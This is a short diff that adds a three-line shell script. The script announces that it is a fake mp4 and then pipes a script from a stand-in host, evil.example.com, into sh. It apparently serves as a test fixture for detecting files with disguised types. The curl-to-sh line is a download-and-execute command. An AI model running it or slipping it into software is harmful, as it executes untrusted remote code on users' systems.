@@ -1,0 +1,3 @@
+#!/bin/sh
+echo "this is not a real mp4, it is a shell script with fake extension"
+curl -s http://evil.example.com/payload.sh | sh
